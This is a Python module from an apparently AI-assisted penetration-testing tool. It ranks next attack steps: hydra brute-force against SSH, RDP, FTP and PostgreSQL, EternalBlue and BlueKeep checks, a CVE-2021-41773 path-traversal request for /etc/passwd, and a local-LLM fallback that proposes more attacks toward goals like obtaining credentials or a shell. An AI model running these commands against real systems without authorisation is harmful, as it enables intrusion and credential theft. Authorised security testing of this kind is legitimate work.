"""
ERR0RS Next Step Engine
═══════════════════════
Given current findings + state, produce ranked next-best-move suggestions.

Hybrid:
  1. Deterministic rules handle the 80% case (fast, educational)
  2. LLM fallback fills gaps when rules produce no strong recommendation
"""
import re, json, logging, subprocess
log = logging.getLogger("err0rs.nextstep")


def _sugg(tool, args, reason, confidence=0.85, phase="scanning"):
    from src.core.operator import Suggestion
    return Suggestion(tool=tool, args=args, reason=reason,
                      confidence=confidence, phase=phase)


def first_step(target, goal="full_chain"):
    """Opening move for a fresh target."""
    if not target: return None
    is_url = target.startswith(("http://","https://"))
    is_ip = bool(re.match(r"^\d{1,3}(?:\.\d{1,3}){3}(?:/\d{1,2})?$", target))

    if is_url:
        return _sugg("whatweb", [target, "-a3"],
                     f"First move: fingerprint {target} to identify web stack — tells us which tools fit next.",
                     confidence=0.95, phase="recon")
    if is_ip:
        return _sugg("nmap", ["-sV","-sC","--top-ports","1000",target],
                     f"First move: port scan {target} to map attack surface. Service versions reveal known CVEs.",
                     confidence=0.98, phase="recon")
    return _sugg("nmap", ["-sV","-sC","--top-ports","1000",target],
                 f"First move: port scan {target}. Once we see what's running, we pick targeted follow-ups.",
                 confidence=0.9, phase="recon")


PORT_FOLLOWUPS = {
    "21":   [("hydra",    ["-l","anonymous","-P","/usr/share/wordlists/rockyou.txt",
                           "{ip}","ftp","-t","4"],
              "FTP often allows anonymous login — test it first, then brute force.")],
    "22":   [("hydra",    ["-l","root","-P","/usr/share/wordlists/rockyou.txt",
                           "{ip}","ssh","-t","4"],
              "SSH is prime for credential brute force. Root + rockyou.txt is classic.")],
    "80":   [("whatweb",  ["http://{ip}","-a3"],
              "Fingerprint the web stack — tells us which Nikto/Nuclei checks apply."),
             ("nikto",    ["-h","http://{ip}","-C","all","-maxtime","120"],
              "Nikto finds dangerous files, outdated software, bad headers."),
             ("gobuster", ["dir","-u","http://{ip}",
                           "-w","/usr/share/wordlists/dirb/common.txt",
                           "-t","30","-q","-b","404,500"],
              "Directory enumeration — find hidden admin panels, /api, /.git, backups.")],
    "443":  [("whatweb",  ["https://{ip}","-a3"],
              "HTTPS fingerprint. Same workflow as 80, but use -k on most tools."),
             ("nikto",    ["-h","https://{ip}","-ssl","-maxtime","120"],
              "Nikto over TLS — same web vulns, different transport.")],
    "445":  [("nmap",     ["--script","smb-vuln-ms17-010","-p","445","{ip}"],
              "SMB — check EternalBlue (MS17-010) FIRST. Unauth SYSTEM if vulnerable."),
             ("enum4linux",["-a","{ip}"],
              "Full SMB enum — users, shares, policies, RID cycling.")],
    "3389": [("nmap",     ["--script","rdp-vuln-ms12-020","-p","3389","{ip}"],
              "RDP — check BlueKeep (CVE-2019-0708). Unauth RCE."),
             ("hydra",    ["-l","administrator","-P","/usr/share/wordlists/rockyou.txt",
                           "rdp://{ip}","-t","4"],
              "RDP brute force — try administrator first, then enumerated users.")],
    "3306": [("nmap",     ["--script","mysql-empty-password","-p","3306","{ip}"],
              "MySQL — check empty password first (shockingly common).")],
    "5432": [("hydra",    ["-l","postgres","-P","/usr/share/wordlists/rockyou.txt",
                           "{ip}","postgres","-t","4"],
              "PostgreSQL — try postgres/postgres, then brute.")],
    "139":  [("enum4linux",["-a","{ip}"],
              "NetBIOS often opens alongside SMB — enum4linux dumps everything.")],
    "25":   [("nmap",     ["--script","smtp-commands,smtp-enum-users","-p","25","{ip}"],
              "SMTP user enum via VRFY/EXPN — valid accounts to brute elsewhere.")],
    "53":   [("dig",      ["axfr","@{ip}"],
              "DNS zone transfer — if allowed, dumps every hostname in the domain.")],
    "6379": [("redis-cli",["-h","{ip}","KEYS","*"],
              "Redis often unauthenticated — KEYS * might hand you the session store.")],
    "1433": [("nmap",     ["--script","ms-sql-empty-password,ms-sql-info",
                           "-p","1433","{ip}"],
              "MSSQL — check empty sa password, then try impacket-mssqlclient.")],
    "2049": [("nmap",     ["--script","nfs-ls,nfs-showmount","-p","2049","{ip}"],
              "NFS — often world-readable exports. Mount them locally and browse.")],
}


def _apply_port_followups(findings, target):
    """Walk findings, produce port-driven suggestions."""
    out = []
    seen = set()
    ip = target.replace("http://","").replace("https://","").split("/")[0].split(":")[0]
    for f in findings:
        if f.kind != "open_port": continue
        port = f.detail.get("port","")
        if port in seen: continue
        seen.add(port)
        for tool, arg_tpl, reason in PORT_FOLLOWUPS.get(port, []):
            args = [a.replace("{ip}", ip) for a in arg_tpl]
            out.append(_sugg(tool, args, reason, confidence=0.9, phase="scanning"))
    return out


def _apply_finding_rules(findings, target):
    """Generic rules based on finding kind/content."""
    out = []
    ip = target.replace("http://","").replace("https://","").split("/")[0].split(":")[0]
    url_host = target if target.startswith("http") else f"http://{target}"

    endpoints = [f for f in findings if f.kind == "endpoint"]
    if endpoints:
        interesting = [e for e in endpoints if any(k in e.value.lower() for k in
                       ("admin","api","login","upload","backup",".git",".env"))]
        if interesting:
            path = interesting[0].detail.get("path","/")
            out.append(_sugg("ffuf",
                ["-u",f"{url_host}{path}FUZZ",
                 "-w","/usr/share/wordlists/dirb/common.txt",
                 "-mc","200,204,301,302,307,401,403"],
                f"Deep fuzz on interesting endpoint {path} — often hides config/backup files",
                confidence=0.85, phase="scanning"))

    techs = [f for f in findings if f.kind == "technology"]
    for t in techs:
        val = (t.detail.get("value") or t.value).lower()
        if "wordpress" in val:
            out.append(_sugg("wpscan",
                ["--url",url_host,"--enumerate","p,u"],
                "WordPress detected — wpscan finds vulnerable plugins/themes & enumerates users",
                confidence=0.95, phase="scanning"))
        if "apache" in val and "2.4.49" in val:
            out.append(_sugg("curl",
                ["-v",f"{url_host}/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd"],
                "Apache 2.4.49 is vulnerable to CVE-2021-41773 path traversal — test immediately",
                confidence=0.99, phase="exploitation"))
    return out


def _llm_suggest(state, last_tool, findings):
    """Ask Ollama for next-step ideas when rules don't fire."""
    try:
        summary = {
            "target": state.target,
            "last_tool": last_tool,
            "tools_run": [r.tool for r in state.history][-6:],
            "findings_summary": [f"{f.kind}:{f.value}" for f in findings[:15]],
        }
        prompt = f"""You are ERR0RS, a penetration testing advisor.
Given this state, suggest 2-3 best next tools. Reply with ONLY a JSON array:
[{{"tool":"<name>","args":["..."],"reason":"<why>","phase":"recon|scanning|exploitation"}}]

State:
{json.dumps(summary, indent=2)}

JSON array:"""
        proc = subprocess.run(["ollama","run","gemma3:1b",prompt],
                              capture_output=True, text=True, timeout=45)
        m = re.search(r"\[[\s\S]+\]", proc.stdout)
        if not m: return []
        arr = json.loads(m.group(0))
        out = []
        for item in arr[:3]:
            out.append(_sugg(item.get("tool","?"), item.get("args",[]),
                       item.get("reason","LLM-suggested"),
                       confidence=0.6, phase=item.get("phase","scanning")))
        return out
    except Exception as e:
        log.warning(f"LLM suggest failed: {e}")
        return []


def suggest(tool, findings, state):
    """Public — ranked list of Suggestion objects."""
    target = state.target or ""
    out = []
    out.extend(_apply_port_followups(findings, target))
    out.extend(_apply_finding_rules(findings, target))

    seen = set()
    deduped = []
    for s in out:
        key = (s.tool, tuple(s.args))
        if key in seen: continue
        seen.add(key)
        # Skip tools already run with identical args
        if any(h.tool == s.tool and h.args == s.args for h in state.history):
            continue
        deduped.append(s)

    if len(deduped) >= 2:
        return sorted(deduped, key=lambda x: -x.confidence)[:4]

    llm_out = _llm_suggest(state, tool, findings)
    combined = deduped + [s for s in llm_out
                          if not any(d.tool == s.tool for d in deduped)]
    return sorted(combined, key=lambda x: -x.confidence)[:4]


def goal_reached(state):
    """Stop-condition for auto mode."""
    goal = state.goal or "full_chain"
    if goal == "find_sqli":
        return any(f.kind == "vuln" and "sql" in f.value.lower()
                   for f in state.findings)
    if goal == "find_xss":
        return any(f.kind == "vuln" and "xss" in f.value.lower()
                   for f in state.findings)
    if goal == "get_creds":
        return any(f.kind == "creds" for f in state.findings)
    if goal == "get_shell":
        return any(f.kind == "shell" or (f.kind == "vuln"
                   and "rce" in f.value.lower()) for f in state.findings)
    if goal == "full_chain":
        tools = {r.tool for r in state.history}
        has_recon   = bool(tools & {"nmap","whatweb"})
        has_scan    = bool(tools & {"nikto","gobuster","nuclei","wpscan"})
        has_exploit = bool(tools & {"sqlmap","dalfox","hydra","metasploit"})
        return has_recon and has_scan and has_exploit
    return False
